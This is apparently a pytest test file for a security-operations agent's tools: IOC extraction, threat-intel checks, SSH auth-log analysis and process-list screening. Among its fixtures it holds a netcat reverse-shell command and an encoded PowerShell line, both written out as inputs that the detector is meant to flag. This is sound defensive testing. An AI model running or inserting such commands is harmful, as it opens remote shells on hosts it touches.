from soc_agent import tools


def test_extract_iocs_handles_defanged_indicators():
    text = "Beacon seen from 185[.]220[.]101[.]45 to hxxp://update-service-cdn.net/beacon"
    result = tools.extract_iocs(text)
    assert "185.220.101.45" in result["ips"]
    assert "update-service-cdn.net" in result["domains"]


def test_extract_iocs_finds_hashes():
    text = "Dropped file hash: 44d88612fea8a8f36de82e1278abb02f"
    result = tools.extract_iocs(text)
    assert "44d88612fea8a8f36de82e1278abb02f" in result["hashes"]


def test_extract_iocs_empty_text():
    result = tools.extract_iocs("nothing interesting here")
    assert result == {"ips": [], "domains": [], "hashes": []}


def test_check_threat_intel_known_malicious_ip():
    result = tools.check_threat_intel("185.220.101.45", "ip")
    assert result["is_known_malicious"] is True
    assert result["confidence"] == "high"


def test_check_threat_intel_unknown_indicator():
    result = tools.check_threat_intel("8.8.8.8", "ip")
    assert result["is_known_malicious"] is False
    assert result["confidence"] == "unknown"


def test_check_threat_intel_rejects_bad_category():
    import pytest

    with pytest.raises(ValueError):
        tools.check_threat_intel("8.8.8.8", "not-a-category")


def test_analyze_auth_log_detects_brute_force():
    log = "\n".join(
        f"Sep  3 02:11:0{i} host sshd[1]: Failed password for root from 10.0.0.9 port 5000{i} ssh2"
        for i in range(5)
    )
    result = tools.analyze_auth_log(log)
    types = {f["type"] for f in result["findings"]}
    assert "brute_force" in types


def test_analyze_auth_log_detects_likely_compromise():
    log = (
        "Sep  3 02:11:01 host sshd[1]: Failed password for root from 10.0.0.9 port 50001 ssh2\n"
        "Sep  3 02:11:02 host sshd[1]: Failed password for root from 10.0.0.9 port 50002 ssh2\n"
        "Sep  3 02:11:03 host sshd[1]: Accepted password for root from 10.0.0.9 port 50003 ssh2\n"
    )
    result = tools.analyze_auth_log(log)
    types = {f["type"] for f in result["findings"]}
    assert "likely_compromise" in types


def test_analyze_auth_log_detects_privilege_escalation():
    log = "Sep  3 02:13:02 host sudo:      root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/whoami"
    result = tools.analyze_auth_log(log)
    types = {f["type"] for f in result["findings"]}
    assert "privilege_escalation" in types


def test_analyze_auth_log_clean_log_has_no_findings():
    log = "Sep  3 02:11:01 host sshd[1]: Accepted password for deploy from 10.0.0.9 port 50001 ssh2"
    result = tools.analyze_auth_log(log)
    assert result["findings"] == []


def test_check_process_list_flags_reverse_shell():
    result = tools.check_process_list(["nc -e /bin/sh 10.0.0.5 4444", "bash"])
    assert len(result["suspicious"]) == 1
    assert result["suspicious"][0]["technique_id"] == "T1059"


def test_check_process_list_flags_encoded_powershell():
    result = tools.check_process_list(["powershell.exe -EncodedCommand SQBFAFgA"])
    assert result["suspicious"][0]["technique_id"] == "T1059"


def test_check_process_list_no_matches():
    result = tools.check_process_list(["/usr/bin/python3 app.py", "nginx: worker process"])
    assert result["suspicious"] == []


def test_lookup_mitre_technique_known():
    technique = tools.lookup_mitre_technique("T1110")
    assert technique["name"] == "Brute Force"


def test_lookup_mitre_technique_unknown():
    technique = tools.lookup_mitre_technique("T9999")
    assert technique["name"] == "Unknown technique"
